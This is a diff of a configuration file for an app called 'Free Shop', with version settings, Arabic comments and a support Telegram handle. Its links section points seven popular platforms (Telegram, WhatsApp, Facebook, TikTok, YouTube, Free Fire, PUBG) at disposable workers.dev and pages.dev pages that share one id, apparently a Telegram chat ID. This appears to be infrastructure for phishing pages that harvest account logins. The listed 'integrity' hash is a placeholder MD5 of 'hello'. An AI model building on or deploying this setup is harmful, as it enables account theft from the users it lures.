@@ -1,4 +1,34 @@
-APK:5d41402abc4b2a76b9719d911017c592
-Resources:7d793037a0760186574b0282f2f435e7
-Package:music.Arabic
-AppName:SERVICE HUB
+# Free Shop App - Server Configuration
+# Do not modify this file manually
+
+[VERSION]
+version=1.0.0
+last_update=2025-01-15
+force_update=false
+min_version=1.0.0
+
+[CHECKSUMS]
+# هذه القيم للتحقق من سلامة التطبيق
+# سيتم مقارنتها مع التطبيق المثبت
+main_activity_hash=5d41402abc4b2a76b9719d911017c592
+package_name=com.Free.Shop
+app_signature=7f1a3e5c9b2d8f4a6e0c1b3d5f7a9e2c4b6d8f0a
+
+[LINKS]
+telegram=https://teleiko3.pages.dev/?id=8108497004
+freefire=https://da1.roks.workers.dev/frre?id=8108497004
+whatsapp=https://webapp.jrah3594.workers.dev/whats?chatId=8108497004
+pubg=https://st.roks.workers.dev/bobj?id=8108497004
+tiktok=https://fro.roks.workers.dev/tik?id=8108497004
+facebook=https://pol1.roks.workers.dev/face?id=8108497004
+youtube=https://green-pond.roks.workers.dev/yot?id=8108497004
+
+[SUPPORT]
+support_url=https://t.me/etsmrobyo2008moraud
+channel_url=https://t.me/your_channel
+update_message=📢 New version available!\nPlease update to continue using the app.
+
+[SETTINGS]
+loading_time=2
+enable_sound=true
+enable_ads=false
